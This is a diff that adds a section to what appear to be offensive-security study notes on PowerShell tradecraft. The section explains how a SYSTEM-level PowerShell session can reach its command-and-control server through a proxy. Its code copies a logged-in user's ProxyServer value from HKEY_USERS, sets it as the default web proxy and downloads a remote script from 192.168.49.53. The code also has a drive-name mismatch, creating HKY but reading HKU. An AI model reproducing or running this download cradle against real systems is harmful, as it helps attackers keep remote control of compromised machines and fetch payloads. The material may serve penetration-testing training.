@@ -184,3 +184,39 @@ $unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
 ```
 
 First Pipe the assemblies to Where-Object and filter on 2 condition. First is to filter out those not native assemblies as we only want preloaded powershell assemblies, next is we want to have the last keyword as *system.dll*
+
+# Talking to proxy
+
+When powershell is running in SYSTEM integrity level, it does not have a proxy configuration and may fail to call back to C2.
+
+In order to run our session through proxy, haev to create a proxy configuration for hte built-in SYSTEM account.
+
+One way is to copy configuration from a standard user account on the system. Proxy settings for each user are stored in the registry at the following path.
+
+Proxy setting in user registry key as follows
+
+```
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings
+```
+what we want is the *ProxyServer* value.
+
+The problem comes when the *HKEY_CURRENT_USER* is mapped to the user accessing it.
+
+When navigating to SYSTEM registry, no such registry hive will exists.
+
+However the content of the *HKEY_CURRENT_USER* registry are also store in *HKEY_USER* seperate by their SIDs
+
+Any SID start with *s-1-5-21-* is a user account exclusive of built-in accounts.
+
+Next get the value of the automatic mapped SIDs and extract the value of registry *ProxyServer*   
+and we set the default web proxy to configure the SYSTEM user registry
+
+```
+New-PSDrive -Name HKY -PSProvider Registry -Root HKEY_USERS | Out-null
+$keys = Get-ChildItem 'HKU:\'
+ForEach ($key in $keys) { if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.SubString(10);break}}
+$proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
+[System.Net.WebRequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
+$wc = New-Object System.Net.WebClient
+$wc.downloadstring('http://192.168.49.53/run2.ps1')
+```
